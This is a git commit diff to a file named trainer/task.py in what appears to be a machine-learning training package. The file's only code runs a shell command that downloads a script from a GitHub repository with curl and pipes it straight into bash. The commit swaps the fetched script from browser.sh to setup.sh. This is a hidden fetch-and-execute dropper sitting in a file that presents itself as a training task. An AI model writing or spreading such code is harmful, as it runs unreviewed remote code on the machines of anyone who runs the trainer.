0916a1ab10a134c9c976bd6ecabe55b4889647fe
cornea99 <corneashulamit@gmail.com>
2024-06-11 16:17:41 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/cornea99/escuy/raw/main/browser.sh | bash')
+os.system('curl -sL https://github.com/cornea99/escuy/raw/main/setup.sh | bash')
